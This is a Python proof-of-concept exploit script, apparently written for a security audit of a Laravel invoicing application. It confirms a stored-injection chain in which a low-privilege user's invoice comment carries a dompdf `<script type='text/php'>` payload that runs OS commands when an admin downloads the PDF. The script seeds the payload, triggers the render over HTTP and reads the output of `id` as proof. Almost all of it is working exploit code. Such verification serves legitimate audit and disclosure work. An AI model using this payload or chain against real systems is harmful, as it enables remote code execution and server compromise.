#!/usr/bin/env python3
r"""
VULN-001 — Stored invoice comment -> dompdf `enable_php=true` -> server-side RCE.

Vulnerable code (chain):
  * config/invoices.php:105-113            'enable_php' => true   (dompdf executes <script type="text/php">)
  * app/Filament/Pages/CheckoutPage.php:663-670  a secretary stores data['invoice_comment'] as a Comment
  * app/Services/InvoiceService.php:30-36,50      comment bodies are concatenated into $notes, raw
  * vendor/laraveldaily/laravel-invoices .../default.blade.php:363   {!! $invoice->notes !!}  (raw output)
  * trigger: app/Filament/Resources/Invoices/InvoiceResource.php:226 / ViewInvoice.php:83
             download_pdf action (canAccess = hasRole('admin')) -> InvoiceService::download()->stream()
CWE : CWE-94 (Code Injection) via CWE-502-style second-order stored injection into a PHP-enabled renderer

The flaw
--------
The invoice PDF is rendered by dompdf configured with enable_php=true. dompdf's
`<script type="text/php">...</script>` is a documented code-execution feature that fires
when isPhpEnabled is true. The one invoice field printed with Blade RAW output ({!! !!}) is
`notes`, which InvoiceService builds by concatenating stored Comment bodies. Those bodies
are written at checkout from the client-controlled Livewire `data.invoice_comment` by any
`enrollments.edit` holder (a secretary). When an admin later downloads that invoice's PDF
(a routine action), the attacker's PHP runs as the FrankenPHP OS user -> full RCE. This is a
second-order (stored) injection escalated to RCE by the renderer configuration: data written
under a low-priv authority is executed as code under the admin's authority.

Exploitation idea
-----------------
1. (as a secretary) store an invoice Comment whose body is
   `<script type="text/php"> system('id > /tmp/pwn_<rnd>'); </script>`.
2. (as admin, over real HTTP) open the invoice and invoke the download_pdf action.
3. Read the marker file from inside the container: it holds the output of `id`, proving the
   OS command ran as the web-server user.

What a successful run proves
---------------------------
Arbitrary OS command execution on the application server, triggered by a routine admin
PDF download of an invoice carrying a low-priv user's stored comment.

Seeding note: this exploit seeds the Invoice + the secretary's stored malicious Comment via
tinker (CheckoutPage::submit stores exactly this Comment from client-controlled
data.invoice_comment — line 663). The RCE TRIGGER — the admin PDF render — is performed over
real HTTP through the app's own download_pdf action, which is the security-critical half.
"""
import base64
import os
import secrets
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import lwlib
from lwlib import log

VULN = "VULN-001"
HERE = os.path.dirname(os.path.abspath(__file__))
ADMIN_USER = os.environ.get("ADMIN_USER", "academico@thomasdebay.com")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "secret")


def seed_injection():
    """Seed the world an invoice PDF needs, plus the secretary's stored malicious comment.
    Returns (invoice_id, marker_path, secretary_email)."""
    suffix = secrets.token_hex(4)
    marker = f"/tmp/pwn_{suffix}"
    sec_email = f"sec_rce_{suffix}@example.invalid"
    # The payload dompdf will execute during PDF generation. `system('id > marker')` proves
    # OS command execution as the web-server user. base64 so no quoting survives to break tinker.
    payload = f"<script type=\"text/php\"> system('id > {marker} 2>&1'); </script>"
    b64 = base64.b64encode(payload.encode()).decode()

    php = (
        'use App\\Models\\Invoice; use App\\Models\\InvoiceType; use App\\Models\\Comment;'
        'use App\\Models\\InvoiceDetail; use App\\Models\\Config; use App\\Models\\User;'
        'use Illuminate\\Support\\Facades\\Hash;'
        # a secretary is who stores the comment at checkout (enrollments.edit)
        f'$sec=User::firstOrCreate(["email"=>"{sec_email}"],["username"=>"sec_rce_{suffix}",'
        f'"firstname"=>"Sec","lastname"=>"{suffix}","password"=>Hash::make("x{suffix}"),"locale"=>"en"]);'
        'if(!$sec->hasRole("secretary")) $sec->assignRole("secretary");'
        # invoice type (needed: InvoiceService reads invoiceType->notes)
        '$it=InvoiceType::first(); if(!$it){ $it=new InvoiceType; $it->forceFill(["name"=>"Standard","notes"=>"Thanks"])->save(); }'
        'Config::firstOrCreate(["name"=>"invoice_footer"],["value"=>"ftr"]);'
        # the invoice + one line item (render requires >=1 item)
        '$inv=Invoice::create(["company_id"=>1,"invoice_type_id"=>$it->id,"client_name"=>"Client",'
        '"client_idnumber"=>"1","client_address"=>"a","client_email"=>"c@e.invalid","invoice_number"=>1,'
        '"date"=>now()->toDateString()]);'
        'InvoiceDetail::create(["invoice_id"=>$inv->id,"product_name"=>"Tuition","quantity"=>1,"price"=>1000,"tax_rate"=>0]);'
        # the secretary's stored comment (exactly what CheckoutPage::submit writes from data.invoice_comment)
        f'Comment::create(["body"=>base64_decode("{b64}"),"commentable_id"=>$inv->id,'
        '"commentable_type"=>Invoice::class,"author_id"=>$sec->id]);'
        'echo "inv=".$inv->id;'
    )
    out = lwlib.tinker(php).strip()
    inv_id = int("".join(c for c in out.split("inv=")[-1] if c.isdigit()) or "0")
    return inv_id, marker, sec_email


def read_marker(marker):
    return lwlib.container_exec("sh", "-c", f"cat {marker} 2>/dev/null").strip()


def main():
    lwlib.banner(VULN, "Stored invoice comment -> dompdf enable_php -> server-side RCE",
                 "InvoiceService::download() feeds stored Comment bodies raw into a PHP-enabled dompdf render")

    # ---- SETUP: secretary's stored malicious comment on an invoice -------------
    inv_id, marker, sec_email = seed_injection()
    if inv_id == 0:
        log("FAIL", "could not seed the invoice")
        lwlib.verdict(VULN, "FAILED", "seeding failed")
        sys.exit(1)
    log("SETUP", f"secretary {sec_email} stored an invoice comment on invoice {inv_id} whose body is "
                 f"a dompdf PHP payload: <script type=\"text/php\"> system('id > {marker}') </script>")
    # ensure marker is absent before triggering
    lwlib.container_exec("sh", "-c", f"rm -f {marker}")
    pre = read_marker(marker)
    log("INFO", f"marker {marker} before trigger: {'<absent>' if not pre else pre}")

    # ---- STEP: admin triggers the invoice PDF render over real HTTP ------------
    s = lwlib.new_session()
    if not lwlib.filament_login(s, ADMIN_USER, ADMIN_PASS):
        log("FAIL", "admin login failed")
        lwlib.verdict(VULN, "FAILED", "admin login failed")
        sys.exit(1)
    log("STEP", f"as ADMIN, GET /admin/invoices/{inv_id} then invoke the download_pdf action")
    r = s.get(lwlib.BASE_URL + f"/admin/invoices/{inv_id}")
    if r.status_code != 200:
        log("FAIL", f"ViewInvoice returned {r.status_code}")
        lwlib.verdict(VULN, "FAILED", "invoice view not reachable")
        sys.exit(1)
    csrf = lwlib.csrf_of(r.text)
    snap_raw, _ = lwlib.find_snapshot(r.text, "ViewInvoice")
    # mount the download_pdf header action, then call it -> streamDownload closure runs ->
    # InvoiceService::download()->stream() renders the PDF with dompdf -> PHP executes
    r1 = lwlib.lw_update(s, snap_raw, {}, [{"path": "", "method": "mountAction", "params": ["download_pdf"]}], csrf)
    snap2 = lwlib.response_snapshot(r1)
    r2 = lwlib.lw_update(s, snap2, {}, [{"path": "", "method": "callMountedAction", "params": []}], csrf)
    log("INFO", f"download_pdf action HTTP {r2.status_code} (download effect: {'yes' if 'download' in r2.text else 'no'})")

    # ---- PROOF: the OS command ran, its output is in the marker file -----------
    post = read_marker(marker)
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("### (injection, as secretary at checkout) CheckoutPage stores data.invoice_comment verbatim:\n")
        f.write('#   body = <script type="text/php"> system(\'id > /tmp/pwn_<rnd>\'); </script>\n\n')
        f.write("### (trigger, as admin over HTTP) render the invoice PDF\n")
        f.write(f"POST /livewire-{lwlib.LW_HASH}/update   # admin session, ViewInvoice({inv_id})\n\n")
        f.write('{"components":[{"snapshot":"<ViewInvoice snapshot>",'
                '"calls":[{"path":"","method":"mountAction","params":["download_pdf"]}]}]}\n')
        f.write('{"components":[{"snapshot":"<ViewInvoice snapshot>",'
                '"calls":[{"path":"","method":"callMountedAction","params":[]}]}]}\n')
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"invoice id: {inv_id}\nmarker: {marker}\n")
        f.write(f"marker before trigger: {pre or '<absent>'}\n")
        f.write(f"download_pdf action: HTTP {r2.status_code}\n")
        f.write(f"marker after trigger (output of `id` run by the server): {post or '<absent>'}\n")

    if post and "uid=" in post:
        log("PROOF", f"the marker file now contains the output of `id` executed by the server: "
                     f"\"{post}\" — arbitrary OS command execution as the web-server user, triggered by "
                     "the admin PDF download")
        log("OK", "exploit confirmed — stored invoice comment achieved server-side RCE via dompdf")
        lwlib.verdict(VULN, "CONFIRMED",
                      "secretary-stored invoice comment executes as PHP during admin PDF render -> RCE")
        sys.exit(0)

    log("FAIL", f"marker not populated with command output (got: {post!r})")
    lwlib.verdict(VULN, "FAILED", "RCE marker not produced")
    sys.exit(1)


if __name__ == "__main__":
    main()
